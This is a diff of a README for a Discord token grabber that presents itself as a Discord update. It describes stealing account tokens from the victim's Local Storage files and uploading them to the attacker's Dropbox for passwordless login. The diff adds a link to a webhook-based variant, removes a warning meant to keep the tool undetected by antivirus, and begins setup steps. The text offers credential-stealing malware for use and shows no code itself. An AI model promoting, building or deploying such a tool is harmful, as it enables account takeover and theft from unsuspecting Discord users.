@@ -1,10 +1,9 @@
 # Dropbox Discord Token Grabber
+## NEW!!44! **[WebhookDiscordTokenGrabber](https://github.com/iklevente/WebhookDiscordTokenGrabber)**
+
 This Discord token grabber is able to get and upload any token from the .ldb and .log files in your Discord's Local Storage folder. You can login with the Discord tokens to the owner's account without a password. [Click here for how to login with it.](https://www.youtube.com/watch?v=FmXMGCRpw50) 
 
 The program looks like a Discord Update, but it actually gets the tokens from the victim's discord app and uploads it to the given Dropbox account.
-
-
-**Currently 100% FUD (no virus detecton) so DO NOT UPLOAD IT TO VIRUSTOTAL AND DO NOT SCAN IT WITH YOUR ANTIVIRUS, BECAUSE LATER IT WILL BE ANALYZED AND IT WILL NO LONGER BE FUD!!!**
 
 ## Steps:
  - Get a Dropbox account
